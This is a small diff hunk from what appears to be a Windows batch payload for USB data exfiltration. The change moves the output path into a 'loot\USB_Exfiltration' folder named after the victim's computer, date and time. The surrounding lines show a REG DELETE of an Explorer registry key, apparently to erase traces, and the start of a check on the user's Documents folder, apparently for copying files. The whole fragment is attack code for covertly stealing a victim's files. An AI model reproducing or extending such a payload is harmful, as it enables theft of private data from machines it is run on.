@@ -6,7 +6,7 @@ REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 REM Creates directory compromised of computer name, date and time
 REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
-set dst=%~dp0\loot\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
 mkdir %dst% >>nul
 
 if Exist %USERPROFILE%\Documents (
